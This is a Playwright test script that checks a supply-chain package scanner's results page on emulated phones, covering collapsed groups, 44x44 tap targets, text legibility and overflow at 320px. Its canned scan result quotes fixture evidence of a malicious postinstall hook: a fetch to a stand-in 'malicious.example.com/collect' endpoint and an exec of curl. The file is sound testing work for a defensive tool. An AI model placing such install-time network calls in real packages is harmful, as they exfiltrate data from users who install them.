// Adversarial lens: mobile scanner @ 375x812.
// Emulate a real iPhone. Load the page. Try to run a scan. Check:
// 1. Read-only permalink replay: <details> collapsed by default, summary visible.
// 2. Tap the summary — expands.
// 3. Text is legible.
// 4. Buttons are >= 44x44 min tap target (WCAG 2.5.5).
// 5. Also try the INTERACTIVE path: since live-npm is gated (non-localhost),
//    on a deployed site the user should NOT see the free-form dropzones.
//    But localhost + tests/preview open them up.
//
// Talks to http://127.0.0.1:4173 (python http.server already running).

import { chromium, devices } from '@playwright/test';

const CANNED_RESULT = {
  verdict: 'BLOCK',
  ecosystem: 'npm',
  durationMs: 1240,
  findings: [
    {
      severity: 'BLOCK',
      package: 'ua-parser-js',
      from: '0.7.28',
      to: '0.7.29',
      detector: 'postinstall-network',
      category: 'INSTALL',
      message: 'Postinstall script contacts a new network endpoint.',
      evidence: [{ file: 'postinstall.js', line: 12, snippet: "fetch('https://malicious.example.com/collect')" }],
      provenance: [['my-app', 'ua-parser-js']],
    },
    {
      severity: 'WARN',
      package: 'ua-parser-js',
      from: '0.7.28',
      to: '0.7.29',
      detector: 'new-child-process',
      category: 'EXEC',
      message: 'New use of child_process.exec.',
      evidence: [{ file: 'index.js', line: 42, snippet: "exec('curl https://example.com')" }],
      provenance: [['my-app', 'ua-parser-js']],
    },
    {
      severity: 'INFO',
      package: 'ua-parser-js',
      from: '0.7.28',
      to: '0.7.29',
      detector: 'meta-change',
      category: 'META',
      message: 'Author changed.',
      evidence: [],
      provenance: [['my-app', 'ua-parser-js']],
    },
  ],
};

function pad(s, n) { return String(s).padEnd(n); }

async function main() {
  const browser = await chromium.launch();
  const ctx = await browser.newContext({
    ...devices['iPhone 13'],
    viewport: { width: 375, height: 812 },
    hasTouch: true,
    isMobile: true,
  });
  const page = await ctx.newPage();
  page.on('console', (msg) => { console.log(`  [browser ${msg.type()}] ${msg.text()}`); });
  page.on('pageerror', (err) => { console.log(`  [pageerror] ${err.message}`); });
  page.on('request', (req) => { if (req.url().includes('/scan/')) console.log(`  [req] ${req.method()} ${req.url()}`); });
  page.on('response', (res) => { if (res.url().includes('/scan/')) console.log(`  [res] ${res.status()} ${res.url()}`); });
  page.on('requestfailed', (req) => { if (req.url().includes('/scan/')) console.log(`  [reqfailed] ${req.method()} ${req.url()} ${req.failure()?.errorText}`); });

  const id = 'a0f9d34e12345678';
  await page.route('**/scan/**', async (route) => {
    const url = new URL(route.request().url());
    if (route.request().method() === 'GET' && url.pathname.endsWith(`/scan/${id}`)) {
      await route.fulfill({ status: 200, contentType: 'application/json',
        body: JSON.stringify({ status: 'ready', result: CANNED_RESULT }) });
      return;
    }
    await route.abort('failed');
  });

  console.log('\n=== SCENARIO A: permalink replay @ 375x812 ===');
  await page.goto(`http://127.0.0.1:4173/?scan=${id}`);
  await page.waitForSelector('#scan-result', { state: 'visible', timeout: 5000 });

  // Small delay to let renderResult finish + ecosystem chip mount.
  await page.waitForTimeout(300);

  // Grab details groups.
  const groups = await page.$$('details.sr-group');
  console.log(`  #details.sr-group count: ${groups.length}`);
  for (const g of groups) {
    const sev = await g.getAttribute('class');
    const isOpen = await g.evaluate(el => el.open);
    const sBox = await g.boundingBox();
    const summ = await g.$('summary');
    const summBox = summ ? await summ.boundingBox() : null;
    const summTxt = summ ? (await summ.textContent() || '').replace(/\s+/g, ' ').trim() : '';
    console.log(`  ${pad(sev, 22)} open=${isOpen}  summary="${summTxt}"  summaryBox=${summBox ? summBox.width.toFixed(0)+'x'+summBox.height.toFixed(0) : 'null'}`);
  }

  // Compact "roll-up" + verdict readable?
  const verdict = await page.textContent('#sr-verdict');
  const meta = await page.textContent('#sr-meta');
  const chip = await page.$('#sr-ecosystem');
  const chipTxt = chip ? await chip.textContent() : null;
  console.log(`  #sr-verdict text: "${verdict}"`);
  console.log(`  #sr-meta text: "${meta}"`);
  console.log(`  #sr-ecosystem chip: "${chipTxt}"`);

  // Buttons: check tap-target size for every visible button.
  console.log('\n  --- BUTTON TAP TARGETS (WCAG 2.5.5 → 44x44 min) ---');
  const btns = await page.$$('#scan button, #scan a.btn, #scan .btn');
  for (const b of btns) {
    const visible = await b.isVisible();
    if (!visible) continue;
    const box = await b.boundingBox();
    const txt = (await b.textContent() || '').replace(/\s+/g, ' ').trim().slice(0, 40);
    const id2 = await b.getAttribute('id');
    const w = box ? box.width : 0;
    const h = box ? box.height : 0;
    const fail = (w < 44 || h < 44) ? ' <-- SUB-44' : '';
    console.log(`    ${pad(id2 || '(no id)', 22)} ${pad(txt, 34)} ${w.toFixed(0)}x${h.toFixed(0)}${fail}`);
  }

  // Also check the sr-copy state.
  const copyBtn = await page.$('#sr-copy');
  const copyVisible = copyBtn ? await copyBtn.isVisible() : false;
  console.log(`  #sr-copy visible: ${copyVisible}`);

  // Check that details is CLOSED by default on mobile.
  console.log('\n  --- COLLAPSE STATE ---');
  const firstGroup = await page.$('details.sr-group');
  if (firstGroup) {
    const open = await firstGroup.evaluate(el => el.open);
    console.log(`  first <details> open on load: ${open}`);
    // Verify a finding-row (INSIDE the collapsed details) is hidden.
    const findingRow = await firstGroup.$('.finding-row');
    const rowVisible = findingRow ? await findingRow.isVisible() : false;
    console.log(`  finding-row visible while closed: ${rowVisible}`);
    // Tap the summary.
    const summ = await firstGroup.$('summary');
    if (summ) {
      await summ.click();
      await page.waitForTimeout(200);
      const openAfter = await firstGroup.evaluate(el => el.open);
      console.log(`  first <details> open after tap: ${openAfter}`);
      const rowVisibleAfter = findingRow ? await findingRow.isVisible() : false;
      console.log(`  finding-row visible after tap: ${rowVisibleAfter}`);
    }
  }

  // Legibility: font-sizes.
  console.log('\n  --- TEXT LEGIBILITY (SUMMARY + FINDING ROW) ---');
  const legibility = await page.evaluate(() => {
    const pick = (el) => {
      if (!el) return null;
      const cs = getComputedStyle(el);
      return { fontSize: cs.fontSize, lineHeight: cs.lineHeight, color: cs.color };
    };
    const summ = document.querySelector('details.sr-group > summary');
    const row = document.querySelector('.finding-row');
    const msg = document.querySelector('.fr-msg');
    const meta = document.querySelector('#sr-meta');
    const evi = document.querySelector('.fr-evidence');
    return {
      summary: pick(summ),
      row: pick(row),
      msg: pick(msg),
      meta: pick(meta),
      evi: pick(evi),
    };
  });
  console.log(`  summary: ${JSON.stringify(legibility.summary)}`);
  console.log(`  row (finding-row): ${JSON.stringify(legibility.row)}`);
  console.log(`  fr-msg: ${JSON.stringify(legibility.msg)}`);
  console.log(`  #sr-meta: ${JSON.stringify(legibility.meta)}`);
  console.log(`  fr-evidence: ${JSON.stringify(legibility.evi)}`);

  // Contrast: summary text on its own effective background (surface-raised on mobile).
  console.log('\n  --- SUMMARY BG (each severity) ---');
  const bgs = await page.evaluate(() => {
    const grps = [...document.querySelectorAll('details.sr-group')];
    return grps.map(g => {
      const sev = [...g.classList].find(c => c === 'BLOCK' || c === 'WARN' || c === 'INFO');
      const summ = g.querySelector('summary');
      const cs = getComputedStyle(summ);
      return { sev, color: cs.color, bg: cs.backgroundColor };
    });
  });
  for (const b of bgs) console.log(`  ${b.sev}: text=${b.color}  bg=${b.bg}`);

  // Screenshot.
  await page.screenshot({ path: '/tmp/lens-mobile-a-permalink-collapsed.png', fullPage: false });

  console.log('\n=== SCENARIO B: interactive live-mode via ?live=1 @ 375x812 ===');
  await page.goto(`http://127.0.0.1:4173/?live=1`);
  await page.waitForSelector('#scan', { state: 'visible' });
  await page.waitForTimeout(300);
  // On mobile, scan-mode is horizontal pills; measure the tabs' tap-target.
  const tabs = await page.$$('#scan-mode [role="tab"]');
  for (const t of tabs) {
    const box = await t.boundingBox();
    const txt = (await t.textContent() || '').replace(/\s+/g, ' ').trim().slice(0, 30);
    const id2 = await t.getAttribute('id');
    console.log(`    ${pad(id2 || '', 14)} "${txt}" ${box ? (box.width.toFixed(0)+'x'+box.height.toFixed(0)) : 'null'}`);
  }
  // Try malicious button:
  const tryMal = await page.$('#scan-example');
  const tryBn = await page.$('#scan-example-benign');
  console.log(`  #scan-example visible: ${tryMal ? await tryMal.isVisible() : false}`);
  console.log(`  #scan-example-benign visible: ${tryBn ? await tryBn.isVisible() : false}`);
  if (tryMal) {
    const mb = await tryMal.boundingBox();
    console.log(`  #scan-example bbox: ${mb ? (mb.width.toFixed(0)+'x'+mb.height.toFixed(0)) : 'null'}`);
  }
  // Try clicking Run (should be disabled). Check its tap size:
  const run = await page.$('#scan-run');
  if (run) {
    const rb = await run.boundingBox();
    console.log(`  #scan-run bbox: ${rb ? (rb.width.toFixed(0)+'x'+rb.height.toFixed(0)) : 'null'}`);
  }
  await page.screenshot({ path: '/tmp/lens-mobile-b-interactive.png', fullPage: false });

  console.log('\n=== SCENARIO C: try-malicious flow on mobile ===');
  // Click try-malicious. That should produce a scan result via corpus_id + Worker.
  // Since we abort **/scan/**, the request will fail — capture the error state.
  if (tryMal) {
    await tryMal.click();
    await page.waitForTimeout(1000);
    const err = await page.$('#scan-error');
    const errVis = err ? await err.isVisible() : false;
    const errTxt = err ? (await err.textContent() || '').replace(/\s+/g, ' ').trim() : '';
    console.log(`  error visible: ${errVis}, err text: "${errTxt.slice(0, 200)}"`);
    // Also try the RETRY button tap size:
    const retry = await page.$('#se-retry');
    if (retry) {
      const rb = await retry.boundingBox();
      console.log(`  #se-retry bbox: ${rb ? (rb.width.toFixed(0)+'x'+rb.height.toFixed(0)) : 'null'}`);
    }
  }

  console.log('\n=== SCENARIO D: NO ?live=1 (production DEPLOYED behavior) — non-localhost gate ===');
  // The isLiveEnabled() function returns true for localhost. So we CAN'T
  // easily test the "deployed non-localhost" path from here without
  // overriding location.hostname. Simulate by evaluating window.__VETLOCK_LIVE__
  // BUT still on localhost — the gate is bypassed. Note gap.
  console.log(`  NOTE: on localhost the live-gate is bypassed. Real deployed behavior differs.`);

  console.log('\n=== SCENARIO E: permalink at 320px (narrower phone) ===');
  await ctx.close();
  const narrowCtx = await browser.newContext({
    viewport: { width: 320, height: 568 }, // iPhone SE 1
    hasTouch: true,
    isMobile: true,
  });
  const narrowPage = await narrowCtx.newPage();
  await narrowPage.route('**/scan/**', async (route) => {
    const url = new URL(route.request().url());
    if (route.request().method() === 'GET' && url.pathname.endsWith(`/scan/${id}`)) {
      await route.fulfill({ status: 200, contentType: 'application/json',
        body: JSON.stringify({ status: 'ready', result: CANNED_RESULT }) });
      return;
    }
    await route.abort('failed');
  });
  await narrowPage.goto(`http://127.0.0.1:4173/?scan=${id}`);
  await narrowPage.waitForSelector('#scan-result', { state: 'visible' });
  await narrowPage.waitForTimeout(300);
  const overflow = await narrowPage.evaluate(() => {
    const doc = document.documentElement;
    return { scrollWidth: doc.scrollWidth, clientWidth: doc.clientWidth };
  });
  console.log(`  page scrollWidth=${overflow.scrollWidth} clientWidth=${overflow.clientWidth}  ${overflow.scrollWidth > overflow.clientWidth ? '<-- HORIZONTAL OVERFLOW' : ''}`);
  await narrowPage.screenshot({ path: '/tmp/lens-mobile-e-320px.png', fullPage: false });

  await narrowCtx.close();
  await browser.close();
}

main().catch((e) => { console.error(e); process.exit(1); });
